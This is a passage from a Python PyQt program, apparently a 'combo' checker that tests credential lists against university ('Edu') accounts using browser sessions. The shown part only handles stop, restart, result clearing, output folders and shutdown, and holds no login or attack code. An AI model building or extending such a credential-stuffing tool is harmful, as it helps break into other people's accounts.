            QTimer.singleShot(1500, self.start_browser_sessions)

        if self.combo_queue.empty() and not self.workers:
            self.start_btn.setEnabled(True)
            self.threads.setEnabled(True)
            self.log("[CHECKER] All checking tasks completed.")
        self.update_counters()

    def stop(self, *args, **kwargs):
        self.stopping = True
        if self.runtime_thread and self.runtime_thread.isRunning():
            self.runtime_thread.stop()
        for worker in self.workers:
            worker.stop()
        self.log("[STOP] Stop requested.")
        self.diagnostic("checker", "stop_requested", {})

    def restart(self):
        self.stop()
        if self.runtime_thread and self.runtime_thread.isRunning():
            return
        if any(worker.isRunning() for worker in self.workers):
            return
        self.clear_results()
        self.log("[SYSTEM] Ready for a new scan.")

    def clear_results(self):
        self.table.setRowCount(0)
        self.results = []
        self.update_results_header_display()
        self.log("[UI] Results cleared.")

    def open_file(self):
        selected_uni = self.engine_selector.currentText()
        if getattr(sys, "frozen", False):
            base = Path(sys.executable).resolve().parent
        else:
            base = Path(__file__).resolve().parent.parent

        base_dir = base / "output" / "Edu_Checker" / selected_uni
        base_dir.mkdir(parents=True, exist_ok=True)
        
        if base_dir.is_dir():
            if sys.platform == "win32":
                os.startfile(str(base_dir))
            else:
                QMessageBox.information(self, "File Path", str(base_dir))
        else:
            QMessageBox.information(self, "Info", f"No results directory available yet for {selected_uni}.")

    def closeEvent(self, event):
        self.stopping = True
        self.stop()
        if self.runtime_thread and self.runtime_thread.isRunning():
            self.runtime_thread.wait(5000)
        for worker in list(self.workers):
            if worker.isRunning():
                worker.wait(2000)
        self.diagnostic("system", "normal_exit", {"events_count": self._diag_count})
        self._diagnostic_dir.cleanup()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = EduCheckerWindow()
    window.show()
    sys.exit(app.exec())